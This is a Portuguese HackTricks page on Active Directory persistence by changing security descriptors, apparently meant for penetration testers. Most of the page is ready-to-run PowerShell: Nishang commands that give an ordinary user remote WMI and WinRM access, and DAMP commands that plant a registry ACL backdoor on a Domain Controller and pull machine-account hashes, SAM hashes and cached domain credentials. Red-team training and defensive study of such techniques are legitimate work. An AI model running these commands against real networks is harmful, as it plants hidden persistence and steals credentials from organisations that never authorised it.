# Descritores de Segurança

A Linguagem de Definição de Descritores de Segurança (SDDL) define o formato usado para descrever um descritor de segurança. O SDDL usa strings ACE para DACL e SACL: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`

Os **descritores de segurança** são usados para **armazenar** as **permissões** que um **objeto** tem **sobre** outro **objeto**. Se você puder fazer apenas uma **pequena alteração** no **descritor de segurança** de um objeto, poderá obter privilégios muito interessantes sobre esse objeto sem precisar ser membro de um grupo privilegiado.

Então, essa técnica de persistência é baseada na habilidade de obter todos os privilégios necessários contra determinados objetos, para poder executar uma tarefa que geralmente requer privilégios de administrador, mas sem a necessidade de ser administrador.

### Acesso ao WMI

Você pode dar a um usuário acesso para **executar remotamente o WMI** [**usando isso**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1):
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### Acesso ao WinRM

Dê acesso ao **console PS do winrm para um usuário** [**usando este**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Acesso remoto a hashes

Acesse o **registro** e **despeje hashes** criando uma **porta dos fundos do Registro usando** [**DAMP**](https://github.com/HarmJ0y/DAMP)**,** para que você possa a qualquer momento recuperar o **hash do computador**, o **SAM** e qualquer **credencial AD em cache** no computador. Portanto, é muito útil conceder essa permissão a um **usuário regular em relação a um computador do Controlador de Domínio**:
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
Verifique [**Silver Tickets**](silver-ticket.md) para aprender como você pode usar o hash da conta de computador de um Controlador de Domínio.

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe seus truques de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
